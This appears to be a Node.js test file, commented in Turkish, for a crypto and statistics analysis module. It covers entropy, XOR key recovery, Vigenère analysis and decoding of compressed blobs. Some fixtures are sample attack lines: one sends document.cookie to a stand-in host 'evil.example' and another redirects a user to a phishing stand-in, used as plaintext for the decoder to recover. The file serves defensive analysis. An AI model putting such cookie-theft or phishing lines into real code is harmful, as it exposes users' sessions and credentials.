// İstatistik/kripto analiz yardımcıları: node test/stats.test.js
import assert from 'node:assert/strict';
import { createHash, randomBytes } from 'node:crypto';
import {
  shannon, entropyVerdict, compressionRatio, compressionEstimate, charDistribution, ecbRepeats, randomnessTests,
  indexOfCoincidence, kasiski, xorByCorrelation, knownPlaintextXor, bruteForceSmall, affineBrute, detectLanguage, entropyWindows,
} from '../src/core/stats.js';

const english = 'the quick brown fox jumps over the lazy dog while the server sends stolen cookies to the remote collector every night. '.repeat(3);
// deterministik rastgele görünümlü veri (SHA-256 sayaç modu): randomBytes ile 256 baytlık pencerelerin ~%1'i
// tesadüfen 7 bit eşiğinin altına düşüyordu (kararsız test)
const rnd = Buffer.concat(Array.from({ length: 64 }, (_, i) => createHash('sha256').update(`peel-${i}`).digest()));

// E617/E618
assert.equal(shannon('aaaa'), 0);
assert.equal(shannon('ab'), 1);
assert.equal(entropyVerdict(rnd).verdict, 'random');
assert.equal(entropyVerdict(Buffer.from(english)).verdict, 'text');
assert.equal(entropyVerdict(rnd.toString('base64')).verdict, 'base64');
assert.equal(entropyVerdict(rnd.toString('hex')).verdict, 'hex');
assert.ok(entropyWindows(rnd).every((w) => w.entropy > 7));

// E619
assert.ok(compressionEstimate(english) < 0.5);
assert.ok(compressionEstimate(rnd) > 1);
assert.ok((await compressionRatio(english)).ratio < 0.5);

// E623
const d = charDistribution('deadBEEF0123');
assert.equal(d.family, 'hex');
assert.equal(d.classes.digit, 4);

// E624
const block = randomBytes(16);
assert.equal(ecbRepeats(Buffer.concat([block, randomBytes(16), block])).ecbLikely, true);
assert.equal(ecbRepeats(rnd).repeats, 0);

// E625
assert.equal(randomnessTests(rnd).looksRandom, true);
assert.equal(randomnessTests(Buffer.from(english)).looksRandom, false);

// E628 ve E627 (Vigenère: anahtar uzunluğu 3)
assert.ok(indexOfCoincidence(english) > 0.055);
let ki = 0;
const vig = english.replace(/[a-z]/g, (c) => String.fromCharCode(((c.charCodeAt(0) - 97 + 'key'.charCodeAt(ki++ % 3) - 97) % 26) + 97));
assert.equal(kasiski(vig).candidates[0].len % 3, 0);
assert.ok(indexOfCoincidence(vig) < indexOfCoincidence(english));

// E626: tekrarlı XOR anahtarı korelasyonla
const key = Buffer.from('s3cr3t!');
const xored = Buffer.from(english).map((b, i) => b ^ key[i % key.length]);
const corr = xorByCorrelation(xored);
assert.equal(Buffer.from(corr.key).toString(), 's3cr3t!');

// E629: bilinen düz metin ("https://")
const pt = 'var u = "https://evil.example/gate.php"; send(u, document.cookie);';
const k2 = [0x13, 0x37, 0x42];
const ct = Buffer.from(pt).map((b, i) => b ^ k2[i % 3]);
const kp = knownPlaintextXor(ct);
assert.deepEqual(kp.key, k2);
assert.equal(kp.text, pt);

// E630: tek bayt toplama ve 16 bit XOR kaba kuvvet
const added = Buffer.from(english).map((b) => (b + 200) & 255);
assert.equal(bruteForceSmall(added)[0].text.slice(0, 20), english.slice(0, 20));
const x16 = Buffer.from(english).map((b, i) => b ^ (i & 1 ? 0x5c : 0xa1));
assert.ok(bruteForceSmall(x16).some((c) => c.method === 'xor16' && c.key === 'a15c'));
const aff = 'the attacker exfiltrates the session token'.replace(/[a-z]/g, (c) => String.fromCharCode(97 + ((5 * (c.charCodeAt(0) - 97) + 8) % 26)));
assert.equal(affineBrute(aff).text, 'the attacker exfiltrates the session token');

// E622
assert.equal(detectLanguage('bu bir deneme metnidir ve şifre çözüldükten sonra okunabilir olmalı').lang, 'tr');
assert.equal(detectLanguage(english).lang, 'en');
assert.equal(detectLanguage('Привет, это тестовая строка').script, 'Kiril');
assert.equal(detectLanguage('x9$Kq!2zP@').natural, false);

// rapor: XOR'lu base64 blob bilinen düz metinle çözülür, rastgele blob "random" olarak işaretlenir
const { blobReport } = await import('../src/core/stats.js');
const rep = await blobReport([ct.toString('base64'), rnd.toString('base64')], english);
assert.equal(rep.blobs[0].recovered.text, pt);
assert.equal(rep.blobs[1].bytes.verdict, 'random');
assert.equal(rep.blobs[1].recovered, undefined);
assert.ok(rep.code.compression.ratio < 0.5);
// E90: brotli ve gzip blob'ları rapor aşamasında açılır
const { brotliCompressSync, gzipSync } = await import('node:zlib');
const payload = 'document.location = "https://phish.example/login?u=" + encodeURIComponent(user);';
const rep2 = await blobReport([brotliCompressSync(Buffer.from(payload)).toString('base64'), gzipSync(Buffer.from(payload)).toString('base64')]);
assert.equal(rep2.blobs[0].decompressed.format, 'brotli');
assert.equal(rep2.blobs[0].decompressed.text, payload);
assert.equal(rep2.blobs[1].decompressed.format, 'gzip');

console.log('stats: ok');
